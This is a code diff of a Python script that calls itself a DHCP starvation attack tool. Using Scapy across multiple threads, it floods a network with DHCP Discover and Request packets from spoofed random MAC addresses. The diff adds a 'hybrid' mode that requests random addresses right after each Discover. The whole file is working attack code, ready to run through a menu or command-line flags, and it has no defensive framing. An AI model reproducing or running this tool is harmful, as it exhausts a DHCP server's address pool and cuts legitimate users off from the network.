@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# DHCP Starvation Attack
+# DHCP Starvation Attack Tool with Real-Time Progress & Hybrid Option
 
 import argparse
 import threading
@@ -16,25 +16,24 @@ RED    = "\033[38;2;255;0;0m"
 RESET  = "\033[0m"
 BOLD   = "\033[1m"
 
-stopAttack = False
+stopAttack  = False
 packetsSent = 0
-stdoutLock = threading.Lock()
+stdoutLock  = threading.Lock()
 timerThread = None
-stopTimer = False
-progressLine = ""
+stopTimer   = False
 
 def SignalHandler(sig, frame):
     global stopAttack, stopTimer, timerThread
     print(f"\n{RED}Stopping the attack...{RESET}")
     stopAttack = True
-    stopTimer = True
+    stopTimer  = True
     if timerThread and timerThread.is_alive():
         timerThread.join()
     sys.exit(0)
 
 def UpdateTimer(startTime):
     while not stopTimer:
-        elapsed = time.time() - startTime
+        elapsed   = time.time() - startTime
         formatted = time.strftime("%H:%M:%S", time.gmtime(elapsed))
         with stdoutLock:
             sys.stdout.write(f"\rPackets sent: {BOLD}{packetsSent}{RESET} | Duration: {BOLD}{formatted}{RESET}")
@@ -44,25 +43,26 @@ def UpdateTimer(startTime):
 def GenerateMac():
     return str(RandMAC())
 
-def BuildDiscover(mac):
-    xid = random.randint(1, 0xFFFFFFFF)
-    packet = (
+def BuildDiscover(mac, xid=None):
+    if xid is None:
+        xid = random.randint(1, 0xFFFFFFFF)
+    pkt = (
         Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
         IP(src="0.0.0.0", dst="255.255.255.255") /
         UDP(sport=68, dport=67) /
         BOOTP(chaddr=bytes.fromhex(mac.replace(":", "")), xid=xid, flags=0x8000) /
-        DHCP(options=[("message-type", "discover"), "end"])
+        DHCP(options=[("message-type","discover"), "end"])
     )
-    return packet, xid, mac
+    return pkt, xid
 
 def BuildRequest(mac, xid, requestedIp, serverIp):
     return (
         Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
-        IP(src="0.0.0.0", dst=serverIp) /
+        IP(src="0.0.0.0", dst="255.255.255.255") /
         UDP(sport=68, dport=67) /
         BOOTP(chaddr=bytes.fromhex(mac.replace(":", "")), xid=xid, flags=0x8000) /
         DHCP(options=[
-            ("message-type", "request"),
+            ("message-type","request"),
             ("requested_addr", requestedIp),
             ("server_id", serverIp),
             "end"
@@ -75,22 +75,20 @@ def NormalWorker(interface, packetsPerThread):
     for _ in range(packetsPerThread):
         if stopAttack:
             break
-        discoverPkt, xid, mac = BuildDiscover(GenerateMac())
+        mac = GenerateMac()
+        discoverPkt, xid = BuildDiscover(mac)
         sendp(discoverPkt, verbose=False)
         packetsSent += 1
 
         def handleOffer(pkt):
             if BOOTP in pkt and pkt[BOOTP].xid == xid and DHCP in pkt:
                 for opt in pkt[DHCP].options:
-                    if opt[0] == "message-type" and opt[1] == 2:
+                    if opt[0]=="message-type" and opt[1]==2:
                         offeredIp = pkt[BOOTP].yiaddr
                         serverIp  = pkt[IP].src
                         req = BuildRequest(mac, xid, offeredIp, serverIp)
                         sendp(req, verbose=False)
                         packetsSent += 1
-                        return True
-            return False
-
         sniff(
             filter="udp and (port 67 or 68)",
             prn=handleOffer,
@@ -99,41 +97,50 @@ def NormalWorker(interface, packetsPerThread):
             stop_filter=lambda x: False
         )
 
-def FastWorker(interface, serverIp, prefix, packetsPerThread):
+def HybridWorker(interface, serverIp, prefix, packetsPerThread):
     global packetsSent
     conf.iface = interface
     for _ in range(packetsPerThread):
         if stopAttack:
             break
         mac = GenerateMac()
+        # Discover
+        discoverPkt, xid = BuildDiscover(mac)
+        sendp(discoverPkt, verbose=False)
+        packetsSent += 1
+        # Immediate Request
         randomIp = f"{prefix}.{random.randint(1,254)}"
-        xid = random.randint(1, 0xFFFFFFFF)
         req = BuildRequest(mac, xid, randomIp, serverIp)
         sendp(req, verbose=False)
         packetsSent += 1
+        # Brief ACK sniff
+        sniff(
+            filter="udp and (port 67 or 68)",
+            prn=lambda p: None,
+            timeout=0.5,
+            iface=interface,
+            stop_filter=lambda p: BOOTP in p and p[BOOTP].xid==xid and DHCP in p and any(o[0]=="message-type" and o[1]==5 for o in p[DHCP].options)
+        )
 
-def StartAttack(interface, threadsCount, packetsPerThread, fastMode, serverIp=None, prefix=None):
+def StartAttack(interface, threadsCount, packetsPerThread, hybridMode, serverIp=None, prefix=None):
     global stopTimer, timerThread
     conf.iface = interface
-    modeName = "FAST" if fastMode else "NORMAL"
-    print(f"{RED}Starting {modeName} DHCP starvation on {interface}{RESET}")
-    if fastMode:
+    mode = "HYBRID" if hybridMode else "NORMAL"
+    print(f"{RED}Starting {mode} DHCP starvation on {interface}{RESET}")
+    if hybridMode:
         print(f" → Server IP: {serverIp}")
         print(f" → Subnet prefix: {prefix}.x")
 
     startTime = time.time()
-    stopTimer = False
+    stopTimer  = False
     timerThread = threading.Thread(target=UpdateTimer, args=(startTime,))
     timerThread.start()
 
     threads = []
+    worker = HybridWorker if hybridMode else NormalWorker
     for _ in range(threadsCount):
-        if fastMode:
-            args = (interface, serverIp, prefix, packetsPerThread)
-            t = threading.Thread(target=FastWorker, args=args)
-        else:
-            args = (interface, packetsPerThread)
-            t = threading.Thread(target=NormalWorker, args=args)
+        args = (interface, serverIp, prefix, packetsPerThread) if hybridMode else (interface, packetsPerThread)
+        t = threading.Thread(target=worker, args=args)
         t.start()
         threads.append(t)
 
@@ -142,9 +149,9 @@ def StartAttack(interface, threadsCount, packetsPerThread, fastMode, serverIp=No
 
     stopTimer = True
     timerThread.join()
-    elapsed = time.time() - startTime
-    formatted = time.strftime("%H:%M:%S", time.gmtime(elapsed))
 
+    elapsed   = time.time() - startTime
+    formatted = time.strftime("%H:%M:%S", time.gmtime(elapsed))
     print(f"\n{BOLD}Attack complete.{RESET}")
     print(f"Packets sent: {BOLD}{packetsSent}{RESET} | Duration: {BOLD}{formatted}{RESET}")
 
@@ -152,34 +159,34 @@ def menu():
     interface = input(f"{RED}Interface (e.g. eth0): {RESET}").strip()
     threads   = int(input(f"{RED}Threads [10]: {RESET}") or "10")
     packets   = int(input(f"{RED}Packets per thread [50]: {RESET}") or "50")
-    fast      = input(f"{RED}Fast mode? (y/N): {RESET}").lower().startswith("y")
+    hybrid    = input(f"{RED}Hybrid mode? (y/N): {RESET}").lower().startswith("y")
     serverIp = prefix = None
-    if fast:
+    if hybrid:
         serverIp = input(f"{RED}DHCP server IP: {RESET}").strip()
         subnet   = input(f"{RED}Subnet (e.g. 192.168.1.0/24): {RESET}").strip()
         prefix   = subnet.rsplit(".",1)[0]
-    StartAttack(interface, threads, packets, fast, serverIp, prefix)
+    StartAttack(interface, threads, packets, hybrid, serverIp, prefix)
 
 def terminal():
     parser = argparse.ArgumentParser(description="DHCP Starvation Tool")
-    parser.add_argument("-i","--interface", required=True, help="Interface to use")
-    parser.add_argument("-t","--threads",   type=int, default=10, help="Number of threads")
-    parser.add_argument("-p","--packets",   type=int, default=50, help="Packets per thread")
-    parser.add_argument("--fast", action="store_true", help="Enable fast mode (requests only)")
-    parser.add_argument("--server", help="DHCP server IP (required in fast mode)")
-    parser.add_argument("--subnet", help="Subnet (e.g. 192.168.1.0/24) for fast mode")
+    parser.add_argument("-i","--interface", required=True)
+    parser.add_argument("-t","--threads", type=int, default=10)
+    parser.add_argument("-p","--packets", type=int, default=50)
+    parser.add_argument("--hybrid", action="store_true", help="Enable hybrid mode (blind handshake)")
+    parser.add_argument("--server", help="DHCP server IP (required for hybrid)")
+    parser.add_argument("--subnet", help="Subnet (e.g. 192.168.1.0/24) for hybrid")
     args = parser.parse_args()
-    if args.fast and (not args.server or not args.subnet):
-        parser.error("--server and --subnet are required in fast mode")
-    prefix = args.subnet.rsplit(".",1)[0] if args.fast else None
-    StartAttack(args.interface, args.threads, args.packets, args.fast, args.server, prefix)
+    if args.hybrid and (not args.server or not args.subnet):
+        parser.error("--server and --subnet required in hybrid mode")
+    prefix = args.subnet.rsplit(".",1)[0] if args.hybrid else None
+    StartAttack(args.interface, args.threads, args.packets, args.hybrid, args.server, prefix)
 
 def main():
     signal.signal(signal.SIGINT, SignalHandler)
-    if len(sys.argv) > 1:
+    if len(sys.argv)>1:
         terminal()
     else:
         menu()
 
-if __name__ == "__main__":
+if __name__=="__main__":
     main()
